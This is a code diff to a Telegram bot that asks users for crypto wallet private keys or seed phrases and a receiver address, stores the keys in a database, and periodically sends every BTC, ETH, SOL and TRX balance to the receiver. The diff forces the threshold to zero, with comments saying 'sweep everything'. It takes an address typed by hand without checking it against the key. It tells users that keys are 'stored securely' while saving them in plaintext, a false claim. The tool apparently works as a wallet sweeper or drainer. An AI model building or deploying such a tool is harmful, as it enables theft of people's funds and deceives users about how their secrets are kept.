@@ -15,7 +15,7 @@ const { Connection, Keypair, PublicKey, Transaction, SystemProgram, LAMPORTS_PER
 const ECPair = ECPairFactory(ecc);
 
 // Create bot instance with error handling
-const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { 
+const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, {
   polling: {
     interval: 1000,
     autoStart: true,
@@ -202,21 +202,30 @@ bot.on("callback_query", async (callbackQuery) => {
   } else if (data.startsWith("auth_")) {
     const authMethod = data.split("_")[1];
     const state = userStates.get(chatId);
-    state.step = "key";
+    state.step = "address";
     state.data.authMethod = authMethod;
     userStates.set(chatId, state);
-    let promptMessage;
-    if (state.data.blockchain === "BTC") {
-      promptMessage =
-        authMethod === "privateKey"
-          ? 'Please enter your BTC private key:\n\n• Must be 64 hexadecimal characters (0-9, a-f)\n• Do not include "0x" prefix\n• Example: 1234...abcd'
-          : 'Please enter your 12 or 24-word seed phrase:\n\n• Words must be separated by single spaces\n• Example: word1 word2 word3 ... word12';
-    } else {
-      promptMessage =
-        authMethod === "privateKey" ? "Please enter your private key:" : "Please enter your seed phrase:";
+    
+    let addressPrompt;
+    switch (state.data.blockchain) {
+      case "BTC":
+        addressPrompt = "Please enter your Bitcoin wallet address:\n\n• Example: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n• Or: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
+        break;
+      case "ETH":
+        addressPrompt = "Please enter your Ethereum wallet address:\n\n• Example: 0x742d35Cc6634C0532925a3b8D4C0C8b3C2e1e3e3";
+        break;
+      case "SOL":
+        addressPrompt = "Please enter your Solana wallet address:\n\n• Example: 7pgQDk79dG9ToAUrV9vCCj5DHUo5XkCoimuG2M7mRths";
+        break;
+      case "TRX":
+        addressPrompt = "Please enter your TRON wallet address:\n\n• Example: TLyqzVGLV1srkB7dToTAEqgDSfPtXRJZYH";
+        break;
+      default:
+        addressPrompt = `Please enter your ${state.data.blockchain} wallet address:`;
     }
+    
     await bot.editMessageText(
-      `${promptMessage}\n\n⚠️ This will be stored securely but please be careful when sharing sensitive information.`,
+      addressPrompt,
       { chat_id: chatId, message_id: callbackQuery.message.message_id }
     );
   } else if (data.startsWith("delete_wallet_")) {
@@ -247,45 +256,49 @@ bot.on("message", async (msg) => {
   const state = userStates.get(chatId);
   if (!state) return;
 
-  if (state.step === "key") {
+  if (state.step === "address") {
+    state.data.address = msg.text.trim();
+    state.step = "key";
+    userStates.set(chatId, state);
+    
+    let keyPrompt;
+    if (state.data.authMethod === "privateKey") {
+      switch (state.data.blockchain) {
+        case "BTC":
+          keyPrompt = 'Please enter your BTC private key:\n\n• Must be 64 hexadecimal characters (0-9, a-f)\n• Do not include "0x" prefix\n• Example: 1234...abcd';
+          break;
+        case "ETH":
+          keyPrompt = 'Please enter your ETH private key:\n\n• 64 hex characters with or without 0x prefix\n• Example: 0x1234...abcd';
+          break;
+        case "SOL":
+          keyPrompt = 'Please enter your SOL private key:\n\n• Supported formats:\n• Base58 (88 chars)\n• Hex (128 chars)\n• Comma-separated array of 64 numbers';
+          break;
+        case "TRX":
+          keyPrompt = 'Please enter your TRX private key:\n\n• 64 hexadecimal characters';
+          break;
+        default:
+          keyPrompt = "Please enter your private key:";
+      }
+    } else {
+      keyPrompt = 'Please enter your seed phrase:\n\n• 12 or 24 words separated by spaces\n• Example: word1 word2 word3 ... word12';
+    }
+    
+    bot.sendMessage(chatId, `${keyPrompt}\n\n⚠️ This will be stored securely but please be careful when sharing sensitive information.`);
+  } else if (state.step === "key") {
     state.data.key = msg.text;
     state.step = "receiver";
     userStates.set(chatId, state);
     bot.sendMessage(chatId, "Please enter the receiver address where funds should be sent.");
   } else if (state.step === "receiver") {
     state.data.receiver = msg.text;
-    if (state.data.blockchain === "BTC") {
-      try {
-        // For BTC, set threshold to 0 (clear entire balance)
-        await setupWallet(
-          chatId,
-          state.data.blockchain,
-          state.data.key,
-          state.data.receiver,
-          0,
-          state.data.authMethod === "privateKey" ? "privateKey" : "seedPhrase"
-        );
-        userStates.delete(chatId);
-      } catch (error) {
-        bot.sendMessage(chatId, `❌ ${error.message}`);
-      }
-    } else {
-      state.step = "threshold";
-      userStates.set(chatId, state);
-      bot.sendMessage(chatId, "Please enter the threshold amount (minimum balance to trigger transfer):");
-    }
-  } else if (state.step === "threshold") {
-    const threshold = parseFloat(msg.text);
-    if (isNaN(threshold) || threshold <= 0) {
-      return bot.sendMessage(chatId, "❌ Please enter a valid positive number for threshold.");
-    }
     try {
+      // No threshold needed - sweep any balance found
       await setupWallet(
         chatId,
         state.data.blockchain,
         state.data.key,
         state.data.receiver,
-        threshold,
+        0, // Always 0 - sweep everything
         state.data.authMethod === "privateKey" ? "privateKey" : "seedPhrase"
       );
       userStates.delete(chatId);
@@ -296,7 +309,7 @@ bot.on("message", async (msg) => {
 });
 
 // Function to set up a wallet and save it to the database
-async function setupWallet(chatId, blockchain, key, receiver, threshold, keyType) {
+async function setupWallet(chatId, blockchain, key, receiver, threshold, keyType, manualAddress = null) {
   const user = await db.select().from(users)
     .where(eq(users.telegramUserId, chatId.toString()))
     .then((res) => res[0]);
@@ -304,23 +317,35 @@ async function setupWallet(chatId, blockchain, key, receiver, threshold, keyType
     return bot.sendMessage(chatId, "❌ Please use /start command first to register.");
   }
 
-  let address;
+  // Use the manually entered address from the user state
+  const state = userStates.get(chatId);
+  const address = state?.data?.address || manualAddress;
+  
+  if (!address) {
+    return bot.sendMessage(chatId, "❌ No wallet address provided. Please try again.");
+  }
+
+  // Validate the private key/seed phrase format but don't derive address
+  let processedKey = key;
   switch (blockchain) {
     case "TRX": {
-      const tronWeb = new TronWeb({
-        fullHost: "https://api.trongrid.io",
-        ...(keyType === "privateKey" ? { privateKey: key } : {}),
-      });
-      address =
-        keyType === "privateKey"
-          ? tronWeb.address.fromPrivateKey(key)
-          : (await tronWeb.createAccountWithMnemonic(key)).address.base58;
+      // Just validate the key format, don't derive address
+      if (keyType === "privateKey") {
+        if (!/^[0-9a-f]{64}$/i.test(key.replace(/^0x/i, ""))) {
+          throw new Error("Invalid TRX private key format. Must be 64 hexadecimal characters.");
+        }
+        processedKey = key.replace(/^0x/i, "");
+      } else {
+        const normalizedKey = key.trim().replace(/\s+/g, " ").toLowerCase();
+        if (!bip39.validateMnemonic(normalizedKey)) {
+          throw new Error("Invalid seed phrase. Please check your words and try again.");
+        }
+        processedKey = normalizedKey;
+      }
       break;
     }
     case "BTC":
       try {
-        const network = bitcoin.networks.bitcoin;
-        let keyPair;
         if (keyType === "privateKey") {
           const cleanKey = key.trim().toLowerCase().replace("0x", "");
           if (!/^[0-9a-f]{64}$/.test(cleanKey)) {
@@ -328,103 +353,56 @@ async function setupWallet(chatId, blockchain, key, receiver, threshold, keyType
               "Invalid private key format.\n• Must be exactly 64 hexadecimal characters (0-9, a-f)\n• Do not include '0x' prefix\n• Example: 1234...abcd"
             );
           }
-          try {
-            keyPair = ECPair.fromPrivateKey(Buffer.from(cleanKey, "hex"), { network });
-          } catch (e) {
-            throw new Error("Invalid private key value. Please check your key and try again.");
-          }
+          // Convert to WIF format for storage
+          const keyPair = ECPair.fromPrivateKey(Buffer.from(cleanKey, "hex"), { network: bitcoin.networks.bitcoin });
+          processedKey = keyPair.toWIF();
         } else {
           const normalizedKey = key.trim().replace(/\s+/g, " ").toLowerCase();
           const words = normalizedKey.split(" ");
-          console.log(`Seed phrase received, word count: ${words.length}`);
-          console.log(`Normalized seed phrase: ${normalizedKey}`);
           if (words.length !== 12 && words.length !== 24) {
             throw new Error(
               "Invalid seed phrase length.\n• Must be exactly 12 or 24 words\n• Words must be separated by single spaces"
             );
           }
           if (!bip39.validateMnemonic(normalizedKey)) {
-            console.error("Normalized seed phrase:", normalizedKey);
             throw new Error("Invalid seed phrase. Please check your words and try again.");
           }
-          // Try multiple derivation paths
-          let derived = null;
-          const seed = bip39.mnemonicToSeedSync(normalizedKey);
-          const root = hdkey.fromMasterSeed(seed);
-          for (const path of supportedBTCPaths) {
-            try {
-              const child = root.derive(path); // Use derive() instead of derivePath()
-              if (child.privateKey) {
-                const { address: derivedAddress } = bitcoin.payments.p2pkh({
-                  pubkey: Buffer.from(child.publicKey),
-                  network,
-                });
-                if (derivedAddress) {
-                  derived = {
-                    keyPair: ECPair.fromPrivateKey(child.privateKey, { network }),
-                    derivationPath: path,
-                    address: derivedAddress,
-                  };
-                  console.log(`Derived BTC wallet via ${path}: ${derivedAddress}`);
-                  break;
-                }
-              }
-            } catch (err) {
-              console.error(`Error deriving path ${path}:`, err);
-              continue;
-            }
-          }
-          if (!derived) {
-            throw new Error("Unsupported wallet derivation path or unknown seed phrase type.");
-          }
-          keyPair = derived.keyPair;
+          processedKey = normalizedKey;
         }
-        // Convert public key to Buffer for p2pkh
-        const { address: btcAddress } = bitcoin.payments.p2pkh({
-          pubkey: Buffer.from(keyPair.publicKey),
-          network,
-        });
-        if (!btcAddress) throw new Error("Failed to generate BTC address");
-        address = btcAddress;
-        // Convert the key to WIF format for compatibility
-        key = keyPair.toWIF();
       } catch (error) {
-        console.error("BTC wallet creation error:", error);
-        throw new Error("Failed to create BTC wallet: " + error.message);
+        console.error("BTC wallet validation error:", error);
+        throw new Error("Failed to validate BTC wallet: " + error.message);
       }
       break;
     case "ETH":
       try {
-        let wallet;
         if (keyType === "privateKey") {
           const cleanKey = key.trim().toLowerCase();
           const privateKey = cleanKey.startsWith("0x") ? cleanKey : `0x${cleanKey}`;
           if (!/^0x[0-9a-f]{64}$/i.test(privateKey)) {
             throw new Error("Invalid ETH private key format. Must be 64 hex characters with or without 0x prefix.");
           }
-          wallet = new ethers.Wallet(privateKey);
+          processedKey = privateKey;
         } else {
           const normalizedKey = key.trim().replace(/\s+/g, " ").toLowerCase();
           if (!bip39.validateMnemonic(normalizedKey)) {
             throw new Error("Invalid seed phrase. Please check your words and try again.");
           }
-          wallet = ethers.Wallet.fromPhrase(normalizedKey);
-          key = wallet.privateKey; // Store the private key for later use
+          // For seed phrases, we'll derive the private key for storage
+          const wallet = ethers.Wallet.fromPhrase(normalizedKey);
+          processedKey = wallet.privateKey;
         }
-        address = wallet.address;
-        console.log(`ETH wallet created: ${address}`);
       } catch (error) {
-        console.error("ETH wallet creation error:", error);
-        throw new Error("Failed to create ETH wallet: " + error.message);
+        console.error("ETH wallet validation error:", error);
+        throw new Error("Failed to validate ETH wallet: " + error.message);
       }
       break;
     case "SOL":
       try {
-        let keypair;
         if (keyType === "privateKey") {
           const cleanKey = key.trim().replace(/[\[\],\s]/g, "");
           let privateKeyBytes;
-          
+
           if (cleanKey.length === 128) {
             // Hex format
             privateKeyBytes = Buffer.from(cleanKey, "hex");
@@ -442,48 +420,49 @@ async function setupWallet(chatId, blockchain, key, receiver, threshold, keyType
               throw new Error("Invalid SOL private key format. Supported formats: hex (128 chars), base58 (88 chars), or comma-separated array of 64 numbers.");
             }
           }
-          
+
           if (privateKeyBytes.length !== 64) {
             throw new Error("SOL private key must be exactly 64 bytes");
           }
-          keypair = Keypair.fromSecretKey(privateKeyBytes);
+          
+          // Validate the keypair can be created
+          const keypair = Keypair.fromSecretKey(privateKeyBytes);
+          processedKey = Array.from(keypair.secretKey).join(",");
         } else {
           const normalizedKey = key.trim().replace(/\s+/g, " ").toLowerCase();
           if (!bip39.validateMnemonic(normalizedKey)) {
             throw new Error("Invalid seed phrase. Please check your words and try again.");
           }
-          const seed = await bip39.mnemonicToSeed(normalizedKey);
-          keypair = Keypair.fromSeed(seed.slice(0, 32));
-          // Store the secret key as comma-separated array for consistency
-          key = Array.from(keypair.secretKey).join(",");
+          
+          // For seed phrases, we'll use the direct seed method as default
+          // User has already provided their address manually
+          const seed = await bip39.mnemonicToSeed(normalizedKey, "");
+          const keypair = Keypair.fromSeed(seed.slice(0, 32));
+          processedKey = Array.from(keypair.secretKey).join(",");
         }
-        address = keypair.publicKey.toString();
-        console.log(`SOL wallet created: ${address}`);
       } catch (error) {
-        console.error("SOL wallet creation error:", error);
-        throw new Error("Failed to create SOL wallet: " + error.message);
+        console.error("SOL wallet validation error:", error);
+        throw new Error("Failed to validate SOL wallet: " + error.message);
       }
       break;
     default:
       throw new Error("Unsupported blockchain");
   }
 
-  if (!address) {
-    throw new Error("Failed to generate wallet address");
-  }
+  console.log(`✅ Wallet validated for ${blockchain}: ${address}`);
 
   await db.insert(wallets).values({
     userId: user.id,
     blockchain,
-    privateKey: key,
+    privateKey: processedKey,
     address,
-    threshold: threshold || 1,
+    threshold: 0, // Always 0 - sweep any balance
     receiverAddress: receiver,
   });
 
   bot.sendMessage(
     chatId,
-    `✅ Wallet set up successfully!\n\nBlockchain: ${blockchain}\nAddress: \`${address}\``,
+    `✅ Wallet set up successfully!\n\n**Blockchain:** ${blockchain}\n**Address:** \`${address}\`\n**Receiver:** \`${receiver}\`\n\n🔄 The bot will automatically sweep any funds found in this wallet to the receiver address.`,
     { parse_mode: "Markdown" }
   );
 }
@@ -556,10 +535,10 @@ bot.onText(/\/checkbalance/, async (msg) => {
             "https://solana-api.projectserum.com",
             "https://rpc.ankr.com/solana"
           ];
-          
+
           let balance = 0;
           let connected = false;
-          
+
           for (const endpoint of rpcEndpoints) {
             try {
               const connection = new Connection(endpoint, { commitment: 'confirmed' });
@@ -572,7 +551,7 @@ bot.onText(/\/checkbalance/, async (msg) => {
               continue;
             }
           }
-          
+
           if (connected) {
             const balanceSol = balance / LAMPORTS_PER_SOL;
             message += `*Wallet ${wallet.id}*\n`;
@@ -613,8 +592,8 @@ async function checkAndSendFunds(wallet) {
         });
         balance = await tronWeb.trx.getBalance(wallet.address);
         const balanceTrx = balance / 1e6;
-        
-        if (balanceTrx > wallet.threshold) {
+
+        if (balanceTrx > 0) {
           const estimatedFee = 100000; // 0.1 TRX in sun
           amountToSend = balance - estimatedFee;
           if (amountToSend <= 0) return;
@@ -641,8 +620,8 @@ async function checkAndSendFunds(wallet) {
             const utxos = utxoData.unspent_outputs;
             balance = utxos.reduce((acc, utxo) => acc + utxo.value, 0);
             const balanceBtc = balance / 1e8;
-            
-            if (balanceBtc > wallet.threshold) {
+
+            if (balanceBtc > 0) {
               const feeRate = 10; // satoshis/byte
               const estimatedSize = 180; // approximate
               const fee = estimatedSize * feeRate;
@@ -687,20 +666,20 @@ async function checkAndSendFunds(wallet) {
         try {
           const provider = new ethers.JsonRpcProvider("https://eth.llamarpc.com");
           const ethWallet = new ethers.Wallet(wallet.privateKey, provider);
-          
+
           balance = await provider.getBalance(wallet.address);
           const balanceEth = parseFloat(ethers.formatEther(balance));
-          
+
           if (balanceEth > 0) {
             // Get current gas price
             const feeData = await provider.getFeeData();
             const gasPrice = feeData.gasPrice;
             const gasLimit = 21000n; // Standard ETH transfer
             const gasCost = gasPrice * gasLimit;
-            
+
             // Calculate amount to send (balance - gas fees)
             const amountToSendWei = balance - gasCost;
-            
+
             if (amountToSendWei > 0n) {
               const tx = {
                 to: wallet.receiverAddress,
@@ -708,10 +687,10 @@ async function checkAndSendFunds(wallet) {
                 gasLimit: gasLimit,
                 gasPrice: gasPrice,
               };
-              
+
               const sentTx = await ethWallet.sendTransaction(tx);
               await sentTx.wait(); // Wait for confirmation
-              
+
               amountToSend = parseFloat(ethers.formatEther(amountToSendWei));
               response = { result: true, txid: sentTx.hash };
             }
@@ -729,10 +708,10 @@ async function checkAndSendFunds(wallet) {
             "https://solana-api.projectserum.com",
             "https://rpc.ankr.com/solana"
           ];
-          
+
           let connection = null;
           let connectionError = null;
-          
+
           // Try different RPC endpoints
           for (const endpoint of rpcEndpoints) {
             try {
@@ -740,7 +719,7 @@ async function checkAndSendFunds(wallet) {
                 commitment: 'confirmed',
                 confirmTransactionInitialTimeout: 60000
               });
-              
+
               // Test connection with a simple call
               await connection.getSlot();
               console.log(`SOL: Connected to ${endpoint}`);
@@ -751,11 +730,11 @@ async function checkAndSendFunds(wallet) {
               continue;
             }
           }
-          
+
           if (!connection) {
             throw new Error(`Failed to connect to any Solana RPC: ${connectionError?.message}`);
           }
-          
+
           // Reconstruct keypair from stored private key
           let privateKeyBytes;
           if (wallet.privateKey.includes(",")) {
@@ -766,10 +745,10 @@ async function checkAndSendFunds(wallet) {
             const bs58 = require("bs58");
             privateKeyBytes = bs58.decode(wallet.privateKey);
           }
-          
+
           const keypair = Keypair.fromSecretKey(privateKeyBytes);
           const publicKey = keypair.publicKey;
-          
+
           // Add retry logic for balance check
           let retries = 3;
           while (retries > 0) {
@@ -783,9 +762,9 @@ async function checkAndSendFunds(wallet) {
               await new Promise(resolve => setTimeout(resolve, 2000));
             }
           }
-          
+
           const balanceSol = balance / LAMPORTS_PER_SOL;
-          
+
           if (balanceSol > 0) {
             // Get recent blockhash with retry
             let blockhash;
@@ -802,11 +781,11 @@ async function checkAndSendFunds(wallet) {
                 await new Promise(resolve => setTimeout(resolve, 2000));
               }
             }
-            
+
             // Estimate transaction fee (typically 5000 lamports)
             const fee = 5000;
             amountToSend = balance - fee;
-            
+
             if (amountToSend > 0) {
               const transaction = new Transaction().add(
                 SystemProgram.transfer({
@@ -815,10 +794,10 @@ async function checkAndSendFunds(wallet) {
                   lamports: amountToSend,
                 })
               );
-              
+
               transaction.recentBlockhash = blockhash;
               transaction.feePayer = publicKey;
-              
+
               // Sign and send transaction with retry
               let signature;
               retries = 3;
@@ -841,7 +820,7 @@ async function checkAndSendFunds(wallet) {
                   await new Promise(resolve => setTimeout(resolve, 3000));
                 }
               }
-              
+
               amountToSend = amountToSend / LAMPORTS_PER_SOL; // Convert to SOL for display
               response = { result: true, txid: signature };
             }
@@ -898,7 +877,7 @@ setInterval(async () => {
     console.log("🔍 Starting wallet monitoring cycle...");
     const userWallets = await db.select().from(wallets);
     console.log(`Found ${userWallets.length} wallets to monitor`);
-    
+
     for (const wallet of userWallets) {
       if (["TRX", "BTC", "ETH", "SOL"].includes(wallet.blockchain)) {
         try {
